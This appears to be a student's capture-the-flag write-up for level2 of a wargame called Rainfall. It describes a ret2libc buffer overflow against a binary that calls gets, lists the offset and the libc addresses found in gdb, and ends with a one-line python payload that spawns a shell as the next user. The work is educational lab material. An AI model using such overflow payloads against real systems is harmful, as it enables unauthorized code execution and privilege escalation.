# Level2

We can see, level1 waits some input and return it

![](/Users/a19523132/school/Rainfall/level2/Ressources/img/level2_launch.png)

Okay, let's launch the binary via [gdb](Ressources/gdb.md) and check all functions in it

Like the previous this one uses `gets`, so we cando a buffer overflow attack.

Do it via [ret2libc attack](??), we need to find:

- Buffer offset
- Addresses of `system`, `exit` and one ret instruction
- Address of the string `/bin/sh`

Once we get those, we use the buffer overflow to override the list of instruction stored in EIP register once again 
to execute a `system("/bin/sh"); exit();`. We determine it through gdb

- Offset = 80
- ret = 0x0804853e
- system = 0xb7e6b060
- exit = 0xb7e5ebe0
- /bin/sh = 0xb7f8cc58

The attack has the next steps: 

1. Induce the overflow
2. Trigger `ret` instruction
3. Call `system`
4. Call `exit`
5. Launch `/bin/sh`

Do that by pushing their addresses in this order on top of EIP.
Using the cat trick like in previous level, we'll get a working shell running as level3.

`(python -c "print '\x90' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]"; cat) | ./level2`

![](/Users/a19523132/school/Rainfall/level2/Ressources/img/level3.png)
